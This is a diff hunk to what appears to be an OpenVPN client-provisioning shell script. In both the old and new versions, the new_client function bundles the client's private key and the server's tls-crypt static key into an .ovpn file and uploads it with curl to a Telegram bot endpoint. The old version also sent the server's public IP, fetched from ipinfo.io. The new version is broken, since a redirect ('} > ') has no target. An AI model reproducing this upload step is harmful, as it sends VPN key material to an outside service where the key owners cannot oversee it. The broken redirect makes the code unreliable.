@@ -94,13 +94,14 @@ new_client () {
 	cat /etc/openvpn/server/easy-rsa/pki/private/"$client".key
 	echo "</key>"
 	echo "<tls-crypt>"
-	get_public_ip=$(curl "ipinfo.io")
-	get_hostname=$(hostname)
-	echo "Hostname: $get_hostname"
 	sed -ne '/BEGIN OpenVPN Static key/,$ p' /etc/openvpn/server/tc.key
 	echo "</tls-crypt>"
-	} > "$script_dir"/"$get_hostname".ovpn
-	curl -v -F "chat_id=$chatId" -F "document=@/root/$get_hostname.ovpn" -F "caption=$get_public_ip" "https://api.telegram.org/bot$botToken/sendDocument"
+	} > 
+	cd /root
+	get_hostname=$(hostname)
+	mv "$client".ovpn "$get_hostname".ovpn
+		echo "$get_hostname"
+	curl -F chat_id=$chatId -F document=@/root/"$get_hostname".ovpn https://api.telegram.org/bot$botToken/sendDocument
 
 }
 
